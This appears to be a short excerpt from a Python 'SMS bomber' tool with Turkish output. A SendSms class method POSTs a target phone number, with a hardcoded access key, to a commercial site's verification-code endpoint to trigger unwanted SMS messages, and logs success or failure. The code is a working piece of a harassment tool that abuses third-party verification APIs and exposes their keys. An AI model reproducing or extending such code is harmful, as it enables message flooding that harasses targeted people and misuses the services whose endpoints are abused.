...
class SendSms():
    ...
    # dsmartgo.com.tr
    def Dsmartgo(self):
        url = "https://api-crm4.ercdn.com/membership/verification/send?key=ac3f095f717f2665f3e8787d8f62ebc1"
        ...
        dsmartgo = requests.request("POST", url, headers=headers, data=payload)
        if dsmartgo.status_code == 200:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarılı! {self.phone} --> dsmartgo.com.tr")
        else:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarısız! {self.phone} --> dsmartgo.com.tr")
            self.adet += 1
